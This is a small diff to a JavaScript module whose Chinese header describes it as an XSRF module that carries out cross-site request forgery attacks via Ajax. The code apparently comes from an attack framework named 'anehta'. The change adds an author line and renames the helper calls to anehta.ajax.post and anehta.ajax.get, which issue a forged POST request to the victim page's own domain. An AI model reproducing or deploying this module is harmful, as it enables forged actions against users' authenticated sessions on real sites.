@@ -1,12 +1,13 @@
 //alert("xsrf.js");
 ////////////////////////////////////////////////
 // XSRF 模块,通过 Ajax 实施XSRF攻击
+// Author: axis
 ////////////////////////////////////////////////
 
 /// 开始执行功能
 if (xmlhttp.init()) {
-  ajaxpost("http://"+$d.domain, "");
-  //ajaxget("http://"+$d.domain+"/fvck");
+  anehta.ajax.post("http://"+$d.domain, "");
+  //anehta.ajax.get("http://"+$d.domain+"/fvck");
 }
 
 /////////////////////////////////////////////////////
